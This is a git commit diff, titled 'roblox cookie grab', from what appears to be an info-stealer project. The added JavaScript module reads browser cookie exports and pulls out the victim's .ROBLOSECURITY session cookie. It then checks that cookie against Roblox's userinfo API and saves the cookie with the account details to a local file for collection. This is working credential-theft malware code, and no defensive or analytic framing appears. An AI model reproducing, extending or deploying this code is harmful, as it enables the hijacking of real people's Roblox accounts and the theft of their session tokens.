4769283f3b0e836652a1fb34e4e1b8f54e58a3eb
Yuuto <55290516+JustYuuto@users.noreply.github.com>
2023-06-26 03:57:24 +0200

    roblox cookie grab

--- functions/grab-roblox.js
+++ functions/grab-roblox.js
@@ -2,14 +2,26 @@ const { join } = require('path');
 const fs = require('fs');
 const { tempFolder } = require('../index');
 const { searchForFile } = require('../util/dir');
+const axios = require('axios');
+const { writeFileSync } = require('fs');
 
-fs.readdirSync(join(tempFolder, 'Browsers'))?.filter(f => f.split('.').length >= 1)?.forEach(async browser => {
-  const file = join(tempFolder, 'Browsers', browser, 'Cookies.csv');
-  await searchForFile(file, 500);
-  const line = fs.readFileSync(file)
-    .toString().split('\n')
-    .find(l => l.includes('.roblox.com') && l.includes('.ROBLOSECURITY'));
-  if (!line) return;
-  const cookie = line.split(',')[2];
-  fs.writeFileSync(join(tempFolder, 'Roblox Cookie.txt'), cookie);
-});
+module.exports = async () => {
+  for (const browser of fs.readdirSync(join(tempFolder, 'Browsers')).filter(f => f.split('.').length >= 1)) {
+    const file = join(tempFolder, 'Browsers', browser, 'Cookies.csv');
+    let line = await searchForFile(file, 500);
+    line = fs.readFileSync(file).toString().split('\n')
+      .find(l => l.includes('.roblox.com') && l.includes('.ROBLOSECURITY'));
+    if (!line) return;
+    const cookie = line.split(',')[2];
+    fs.writeFileSync(join(tempFolder, 'Roblox Cookie.txt'), cookie);
+  }
+
+  const file = await searchForFile(join(tempFolder, 'Roblox Cookie.txt'), 1000, 10);
+  if (!file || file.trim() === '') return;
+  const jsonFile = join(tempFolder, 'Roblox.json');
+  const account = await axios.get('https://www.roblox.com/mobileapi/userinfo', {
+    headers: { Cookie: '.ROBLOSECURITY=' + file.replaceAll('"', '') }
+  });
+  account.data.cookie = file.replaceAll('"', '');
+  writeFileSync(jsonFile, JSON.stringify(account.data));
+};
